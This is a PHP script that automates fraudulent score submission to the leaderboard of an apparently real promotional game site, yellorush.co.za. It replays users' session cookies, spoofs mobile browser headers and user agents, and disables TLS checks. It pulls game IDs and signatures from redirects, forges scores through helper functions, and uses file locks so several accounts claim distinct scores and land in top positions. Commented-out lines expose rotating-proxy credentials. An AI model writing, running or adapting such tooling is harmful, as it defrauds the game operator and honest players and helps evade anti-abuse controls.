 <?php
//sleep(rand(30,60));

date_default_timezone_set('Africa/Johannesburg');
$current_time = new DateTime();
$check_time = new DateTime('04:00'); 
$check_tim = new DateTime('12:00');


//Business of the day

require_once('Tools-mtn-v2.php');
// Shared score locking to ensure unique score per running cookie
function score_lock_file_path() {
    return __DIR__ . '/new/data/score-locks-mtn.json';
}

function current_hour_key() {
    return date('Y-m-d-H');
}

function ensure_score_lock_file_exists() {
    $path = score_lock_file_path();
    if (!file_exists($path)) {
        $dir = dirname($path);
        if (!is_dir($dir)) {
            @mkdir($dir, 0777, true);
        }
        file_put_contents($path, json_encode([
            'hour_key' => current_hour_key(),
            'scores' => new stdClass(),
            'cookies' => new stdClass(),
            'initial_done' => new stdClass(),
            'first_used' => new stdClass()
        ], JSON_PRETTY_PRINT));
    }
}

function with_score_state(callable $fn) {
    ensure_score_lock_file_exists();
    $path = score_lock_file_path();
    $fp = fopen($path, 'c+');
    if (!$fp) { return null; }
    try {
        if (!flock($fp, LOCK_EX)) { fclose($fp); return null; }
        $raw = stream_get_contents($fp);
        $state = json_decode($raw ?: '{}', true);
        if (!is_array($state)) { $state = []; }
        // Initialize state buckets
        if (!isset($state['scores']) || !is_array($state['scores'])) { $state['scores'] = []; }
        if (!isset($state['cookies']) || !is_array($state['cookies'])) { $state['cookies'] = []; }
        if (!isset($state['initial_done']) || !is_array($state['initial_done'])) { $state['initial_done'] = []; }
        if (!isset($state['first_used']) || !is_array($state['first_used'])) { $state['first_used'] = []; }
        $now_key = current_hour_key();
        if (!isset($state['hour_key']) || $state['hour_key'] !== $now_key) {
            // Reset all locks and initial flags at the start of a new hour
            $state['hour_key'] = $now_key;
            $state['scores'] = [];
            $state['cookies'] = [];
            $state['initial_done'] = [];
            $state['first_used'] = [];
        }
        $result = $fn($state);
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, json_encode($state, JSON_PRETTY_PRINT));
        fflush($fp);
        flock($fp, LOCK_UN);
        fclose($fp);
        return $result;
    } catch (\Throwable $e) {
        try { flock($fp, LOCK_UN); fclose($fp); } catch (\Throwable $e2) {}
        return null;
    }
}

function cookie_key($cookie) {
    return substr(sha1($cookie), 0, 16);
}

function claim_unique_score($cookie, $candidates) {
    $key = cookie_key($cookie);
    return with_score_state(function (&$state) use ($key, $candidates) {
        // Only enforce a unique claim for the cookie's initial run within the hour
        if (isset($state['initial_done'][$key]) && $state['initial_done'][$key] === true) {
            return null; // initial unique attempt already performed this hour
        }
        // Find first free candidate score and claim it
        foreach ($candidates as $score) {
            $skey = (string)$score;
            if (!isset($state['scores'][$skey]) && !isset($state['first_used'][$skey])) {
                $state['scores'][$skey] = $key;
                $state['cookies'][$key] = $score;
                $state['initial_done'][$key] = true; // mark initial attempt recorded for this hour
                $state['first_used'][$skey] = true;   // remember this score is used for initial attempts this hour
                return [ 'cookie_key' => $key, 'score' => $score ];
            }
        }
        return null;
    });
}

function release_unique_score($cookie) {
    $key = cookie_key($cookie);
    with_score_state(function (&$state) use ($key) {
        if (isset($state['cookies'][$key])) {
            $score = $state['cookies'][$key];
            unset($state['cookies'][$key]);
            $skey = (string)$score;
            if (isset($state['scores'][$skey]) && $state['scores'][$skey] === $key) {
                unset($state['scores'][$skey]);
            }
        }
        return null;
    });
}
// while(true){
system('cls');
$uA = RandomUa();
$scoreTarget = TargetScore();
$number3 = GetTargetScore(1);

// if ($number3>=400){
//  sleep(rand(10,90));
// }



    




$cookie = isset($_GET['c']) ? trim($_GET['c']) : '';
        

// $MAX_SCORE = 6000;

$pos = GetPosition ($cookie);
$b4Score = GetTargetScore($pos);
echo "\nOur target score is: $number3 at pos $pos";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://yellorush.co.za/play-now');
        // curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
        // curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'ofzhbdla-rotate:5hgqeorbbfwm');
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language: en-US,en;q=0.9',
            'Cache-Control: no-cache',
            'Connection: keep-alive',
            'Cookie: '.$cookie,
            'Pragma: no-cache',
            'Host: www.yellorush.co.za',
            'Referer: https://yellorush.co.za/',
            'Sec-CH-UA: \"Safari\";v=\"15\", \"AppleWebKit\";v=\"605\"',
            'Sec-CH-UA-Mobile: ?1',
            'Sec-CH-UA-Platform: \"iOS\"',
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Site: same-origin',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: '.$uA
        );
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $curl = curl_exec($ch);
        $redirectedUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
                    
        curl_close($ch);
        $query_str = parse_url($redirectedUrl, PHP_URL_QUERY);
        parse_str($query_str, $query_params);
        $unique_id = isset($query_params['unique_id']) ? $query_params['unique_id'] : '';
        $game_id = isset($query_params['game_id']) ? $query_params['game_id'] : '';
        $sigv1 = isset($query_params['sigv1']) ? $query_params['sigv1'] : '';

             if (empty($unique_id)){
                 return;
             }

        // echo "<br>Uniquie_id: $unique_id<hr>";
        // echo "<br>Game_id: $game_id<hr>";


        ###################
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://yellorush.co.za/new-game-check-user-status/'.$unique_id.'/'.$sigv1.'');
        // curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
        // curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'ofzhbdla-rotate:5hgqeorbbfwm');
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array(
            'Host: www.yellorush.co.za',
            'Referer:'.$redirectedUrl,
            'Sec-CH-UA: \"Safari\";v=\"15\", \"AppleWebKit\";v=\"605\"',
            'Sec-CH-UA-Mobile: ?1',
            'Sec-CH-UA-Platform: \"iOS\"',
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Site: same-origin',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: '.$uA,
        );
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HEADER, 1);

        $curl = curl_exec($ch);

        // Separate headers and body
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $header = substr($curl, 0, $header_size);
        $body = substr($curl, $header_size);
        curl_close($ch);

        
        
        $x_power = X_Power($header);
        echo "\n<br> X-Powered-Version: $x_power\n";



// Adjustable score range for leaderboard placement
$scoreStart = 49679; // lowest score to consider
$scoreEnd   = 49690; // highest score to consider

// Skip if this cookie already holds a top 10 position
// Refresh position to ensure it's up to date
$pos = GetPosition($cookie);
if ($pos > 0 && $pos <= 1) {
    echo "\nAlready in top 10 at position $pos, skipping request.";
  sleep(rand(120,340));
    exit;
}

$success = false;
$currentScore = null;

// Build and shuffle the score list so each score is attempted once in random order
// $max = 33642;
// $count = 10;
// $min = $max - ($count - 1);
// $scores = range($max, $min);
// shuffle($scores);


// Build candidate pool locally (no live fetch)
// Example: max=1200, count=10, step=10 → 1200,1190,... then shuffle
$max = 1200;
$count = 10;
$step = 100;
$min = $max - ($count - 1) * $step;
$candidates = range($max, $min, -$step);
shuffle($candidates); // randomize order per run; unique-first is enforced by the lock

// Claim a unique score for this cookie so no other cookie uses it concurrently
// First: perform one unique attempt for this hour (race at the top of the hour)
$claim = claim_unique_score($cookie, $candidates);
if ($claim) {
    $score = $claim['score'];
    echo "\nClaimed unique score $score for cookie (initial attempt).";
    try {
        $increment = 1;
        $uA = RandomUa();
        $memory = validate_request($x_power, $score);
        $x_power = generateRandomDivisionData($score, $redirectedUrl, $x_power, $memory, $increment, $uA);
        $pos = GetPosition($cookie);
        $currentScore = GetTargetScore($pos);
        echo "\nLeaderboard value: $currentScore at pos $pos";
        if ($currentScore != $b4Score && $pos > 0 && $pos <= 6) {
            $success = true;
        } else {
            echo "\nScore $score failed to update.";
        }
    } finally {
        // Immediately release the claimed score so others can try it afterward
        release_unique_score($cookie);
    }
} else {
    echo "\nNo unique score claim available (others claimed). Proceeding to non-unique attempts.";
}

// If not successful yet, continue to try remaining candidates this round (excluding the initial one if used)
if (!$success) {
    $remaining = isset($score) ? array_values(array_filter($candidates, function($s) use ($score) { return (int)$s !== (int)$score; })) : $candidates;
    foreach ($remaining as $tryScore) {
        echo "\nTrying score $tryScore";
        $increment = 1;
        $uA = RandomUa();
        $memory = validate_request($x_power, $tryScore);
        $x_power = generateRandomDivisionData($tryScore, $redirectedUrl, $x_power, $memory, $increment, $uA);
        $pos = GetPosition($cookie);
        $currentScore = GetTargetScore($pos);
        echo "\nLeaderboard value: $currentScore at pos $pos";
        if ($currentScore != $b4Score && $pos > 0 && $pos <= 6) {
            $success = true;
            break;
        }
        echo "\nScore $tryScore failed to update.";
    }
}

if ($success) {
    echo "\nLeaderboard updated with score: $currentScore";
} else {
    echo "\nFailed to update leaderboard";
}
